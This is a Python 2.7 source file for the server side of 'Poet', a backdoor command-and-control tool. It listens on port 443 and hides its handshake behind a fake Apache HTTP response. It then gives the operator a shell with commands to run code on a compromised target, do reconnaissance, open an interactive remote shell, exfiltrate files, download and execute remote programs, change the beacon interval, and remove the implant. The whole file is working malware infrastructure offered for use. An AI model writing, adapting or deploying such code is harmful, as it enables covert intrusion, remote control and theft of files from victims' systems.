#!/usr/bin/python2.7

import re
import sys
import zlib
import base64
import socket
import struct
import os.path
import argparse
from datetime import datetime

OUT = 'archive'
SBUF_LEN = 9
SIZE = 4096
PSH_PROMPT = 'psh > '
FAKEOK = """HTTP/1.1 200 OK\r
Date: Tue, 19 Mar 2013 22:12:25 GMT\r
Server: Apache\r
X-Powered-By: PHP/5.3.10-1ubuntu3.2\r
Content-Length: 364\r
Content-Type: text/plain\r
\r
body{background-color:#f0f0f2;margin:0;padding:0;font-family:"Open Sans","Helvetica Neue",Helvetica,Arial,sans-serif}div{width:600px;margin:5em auto;padding:50px;background-color:#fff;border-radius:1em}a:link,a:visited{color:#38488f;text-decoration:none}@media (max-width:700px){body{background-color:#fff}div{width:auto;margin:0 auto;border-radius:0;padding:1em}}"""


class PoetSocket():
    """Socket wrapper for client/server communications.

    Attributes:
        s: socket instance

    Socket abstraction which uses the convention that the message is prefixed
    by a big-endian 32 bit value indicating the length of the following base64
    string.
    """

    def __init__(self, s):
        self.s = s

    def exchange(self, msg):
        self.send(msg)
        return self.recv()

    def send(self, msg):
        """Send message over socket."""

        pkg = base64.b64encode(msg)
        pkg_size = struct.pack('>i', len(pkg))
        sent = self.s.sendall(pkg_size + pkg)
        if sent:
            raise socket.error('socket connection broken')

    def recv(self):
        """Receive message from socket.

        Returns:
            The message sent from client.
        """

        chunks = []
        bytes_recvd = 0
        prefix_len = 4

        # In case we don't get all 4 bytes of the prefix the first recv(),
        # this ensures we'll eventually get it intact
        while bytes_recvd < prefix_len:
            chunk = self.s.recv(SIZE)
            if not chunk:
                raise socket.error('socket connection broken')
            chunks.append(chunk)
            bytes_recvd += len(chunk)

        initial = ''.join(chunks)
        msglen, initial = (struct.unpack('>I', initial[:prefix_len])[0],
                           initial[prefix_len:])
        del chunks[:]
        bytes_recvd = len(initial)
        chunks.append(initial)
        while bytes_recvd < msglen:
            chunk = self.s.recv(min((msglen - bytes_recvd, SIZE)))
            if not chunk:
                raise socket.error('socket connection broken')
            chunks.append(chunk)
            bytes_recvd += len(chunk)
        return base64.b64decode(''.join(chunks))


class PoetSocketServer(PoetSocket):
    def __init__(self, port):
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.s.bind(('', port))
        self.s.listen(1)

    def accept(self):
        return self.s.accept()


class PoetServer(object):
    """Core server functionality.

    Implements psh, and necessary helper functions.

    Attributes:
        s: socket instance for initial client connection
        conn: socket instance for actual client communication
        cmds: list of supported psh commands
    """

    def __init__(self, s):
        self.s = s
        self.conn = None
        self.cmds = ['exit', 'help', 'exec', 'recon', 'shell', 'exfil',
                     'selfdestruct', 'dlexec', 'chint']

    def psh(self):
        """Poet server control shell."""

        print '[+] ({}) Entering control shell'.format(datetime.now())
        self.conn = PoetSocket(self.s.accept()[0])
        prompt = self.conn.exchange('getprompt')
        print 'Welcome to psh, the poet shell!'
        print 'Running `help\' will give you a list of supported commands.'
        while True:
            try:
                inp = raw_input(PSH_PROMPT)
                if inp == '':
                    continue
                base = inp.split()[0]
                # exit
                if base == self.cmds[0]:
                    break
                # help
                elif base == self.cmds[1]:
                    print 'Commands:\n  {}'.format('\n  '.join(sorted(self.cmds)))
                # exec
                elif base == self.cmds[2]:
                    inp += ' '  # for regex
                    exec_regex = '^exec( -o( [\w.]+)?)? (("[^"]+")\ )+$'
                    if re.search(exec_regex, inp):
                        self.generic(*self.exec_preproc(inp))
                    else:
                        self.cmd_help(2)
                # recon
                elif base == self.cmds[3]:
                    if re.search('^recon( -o( [\w.]+)?)?$', inp):
                        if '-o' in inp.split():
                            if len(inp.split()) == 3:
                                self.generic(base, True, inp.split()[2])
                            else:
                                self.generic(base, True)
                        else:
                            self.generic(base)
                    else:
                        self.cmd_help(3)
                # shell
                elif base == self.cmds[4]:
                    if inp == 'shell':
                        self.shell(prompt)
                    else:
                        self.cmd_help(4)
                # exfil
                elif base == self.cmds[5]:
                    if re.search('^exfil ([\w\/\\.~:\-]+ )+$', inp + ' '):
                        for file in inp.split()[1:]:
                            resp = self.conn.exchange('exfil ' + file)
                            if 'No such' in resp:
                                print 'psh : {}: {}'.format(resp, file)
                                continue
                            resp = zlib.decompress(resp)
                            write_file = file.split('/')[-1].strip('.')
                            self.write(resp, base, OUT, write_file)
                    else:
                        self.cmd_help(5)
                # selfdestruct
                elif base == self.cmds[6]:
                    if inp == 'selfdestruct':
                        print """[!] WARNING: You are about to permanently remove the client from the target.
    You will immediately lose access to the target. Continue? (y/n)""",
                        if raw_input().lower()[0] == 'y':
                            resp = self.conn.exchange('selfdestruct')
                            if resp == 'boom':
                                print '[+] ({}) Exiting control shell.'.format(datetime.now())
                                return
                            else:
                                print 'psh : Self destruct error: {}'.format(resp)
                        else:
                            print 'psh : Aborting self destruct.'
                    else:
                        self.cmd_help(6)
                # dlexec
                elif base == self.cmds[7]:
                    if re.search('^dlexec https?:\/\/[\w.\/]+$', inp):
                        resp = self.conn.exchange(inp)
                        msg = 'successful' if resp == 'done' else 'error: ' + resp
                        print 'psh : dlexec {}'.format(msg)
                    else:
                        self.cmd_help(7)
                # chint
                elif base == self.cmds[8]:
                    if re.search('^chint \d+$', inp):
                        num = int(inp[6:])
                        if num < 1 or num > 604800:
                            print 'psh : Invalid interval time.'
                        else:
                            resp = self.conn.exchange(inp)
                            msg = 'successful' if resp == 'done' else 'error: ' + resp
                            print 'psh : chint ({}) {}'.format(num, msg)
                    else:
                        self.cmd_help(8)
                else:
                    print 'psh: {}: command not found'.format(base)
            except KeyboardInterrupt:
                print
                continue
            except EOFError:
                print
                break
        self.conn.send('fin')
        print '[+] ({}) Exiting control shell.'.format(datetime.now())

    def generic(self, req, write_flag=False, write_file=None):
        """Abstraction layer for exchanging with client and writing to file.

        Args:
            reg: command to send to client
            write_flag: whether client response should be written
            write_file: optional filename to use for file
        """

        resp = self.conn.exchange(req)
        if req == self.cmds[3]:
            resp = zlib.decompress(resp)
        print resp
        if write_flag:
            self.write(resp, req.split()[0], OUT, write_file)

    def write(self, response, prefix, out_dir, write_file=None):
        """Write to server archive.

        Args:
            response: data to write
            prefix: directory to write file to (usually named after command
                    executed)
            out_dir: name of server archive directory
            write_file: optional filename to use for file
        """

        ts = datetime.now().strftime('%Y%m%d%M%S')
        out_ts_dir = '{}/{}'.format(out_dir, ts[:len('20140101')])
        out_prefix_dir = '{}/{}'.format(out_ts_dir, prefix)
        if write_file:
            tmp = write_file.split('.')
            ext = '.{}'.format(''.join(tmp[1:])) if tmp[1:] else ''
            outfile = '{}/{}-{}{}'.format(out_prefix_dir, tmp[0], ts, ext)
        else:
            outfile = '{}/{}-{}.txt'.format(out_prefix_dir, prefix, ts)
        if not os.path.isdir(out_dir):
            os.mkdir(out_dir)
        if not os.path.isdir(out_ts_dir):
            os.mkdir(out_ts_dir)
        if not os.path.isdir(out_prefix_dir):
            os.mkdir(out_prefix_dir)
        with open(outfile, 'w') as f:
            f.write(response)
            print 'psh : {} written to {}'.format(prefix, outfile)

    def cmd_help(self, ind):
        """Print help messages for psh commands."""

        if ind == 2:
            print 'Execute commands on target.'
            print 'usage: exec [-o [filename]] "cmd1" ["cmd2" "cmd3" ...]'
            print '\nExecute given commands and optionally log to file with optional filename.'
            print '\noptions:'
            print '-h\t\tshow help'
            print '-o filename\twrite results to file in {}/'.format(OUT)
        elif ind == 3:
            print 'Basic reconaissance of target.'
            print 'usage: recon [-h] [-o]'
            print '\nExecutes, whoami, id, w, who -a, uname -a, and lsb_release -a on target where applicable.'
            print '\noptions:'
            print '-h\t\tshow help'
            print '-o\t\twrite results to file in {}/'.format(OUT)
        elif ind == 4:
            print 'Basic shell on target (forwards stdout of commands executed).'
            print 'usage: shell [-h]'
            print '\noptions:'
            print '-h\t\tshow help'
        elif ind == 5:
            print 'Exfiltrate files.'
            print 'usage: exfil [-h] file1 [file2 file3 ...]'
            print '\nDownloads files to {}/'.format(OUT)
            print '\noptions:'
            print '-h\t\tshow help'
        elif ind == 6:
            print 'Self destruct.'
            print 'usage: selfdestruct [-h]'
            print '\nPermanently remove client from target.'
            print '\noptions:'
            print '-h\t\tshow help'
        elif ind == 7:
            print 'Download and execute.'
            print 'usage: dlexec [-h] http://my.pro/gram'
            print '\nDownload executable from internet and execute.'
            print '\noptions:'
            print '-h\t\tshow help'
        elif ind == 8:
            print 'Change interval.'
            print 'usage: chint [-h] seconds'
            print '\nChange the client delay interval (seconds).'
            print 'Minimum allowed value is 1 and maximum is 604800 (1 week).'
            print '\noptions:'
            print '-h\t\tshow help'

    def exec_preproc(self, inp):
        """Parse psh `exec' command line.

        Args:
            inp: raw `exec' command line

        Returns:
            Tuple suitable for expansion into as self.generic() parameters.
        """

        tmp = inp.split()
        write_file = None
        write_flag = tmp[1] == '-o'
        if write_flag:
            if '"' not in tmp[2]:
                write_file = tmp[2]
                del tmp[2]
            del tmp[1]
        tmp = ' '.join(tmp)
        return tmp, write_flag, write_file

    def shell(self, prompt):
        """Psh `shell' command implementation.

        Args:
            prompt: shell prompt to use
        """

        while True:
            try:
                inp = raw_input(PSH_PROMPT + prompt)
                if inp == '':
                    continue
                elif inp == 'exit':
                    break
                else:
                    self.conn.send('shell {}'.format(inp))
                    while True:
                        rec = self.conn.recv()
                        if rec == 'shelldone':
                            break
                        else:
                            print rec,
            except KeyboardInterrupt:
                print
                continue
            except EOFError:
                print
                break


def get_args():
    """ Parse arguments and return dictionary. """

    parser = argparse.ArgumentParser()
    parser.add_argument('-p', '--port')
    return parser.parse_args()


def main():
    args = get_args()
    PORT = int(args.port) if args.port else 443
    s = PoetSocketServer(PORT)
    print '[+] Poet server started on {}.'.format(PORT)
    conn, addr = s.accept()
    print '[+] ({}) Connected By: {}'.format(datetime.now(), addr)
    ping = conn.recv(SIZE)
    if not ping:
        raise socket.error('socket connection broken')
    if ping.startswith('GET /style.css HTTP/1.1'):
        conn.send(FAKEOK)
        conn.close()
        try:
            PoetServer(s).psh()
        except socket.error as e:
            print '[!] ({}) Socket error: {}'.format(datetime.now(), e.message)
            print '[-] ({}) Poet terminated.'.format(datetime.now())
            sys.exit(0)
    print '[-] ({}) Poet terminated.'.format(datetime.now())

if __name__ == '__main__':
    main()
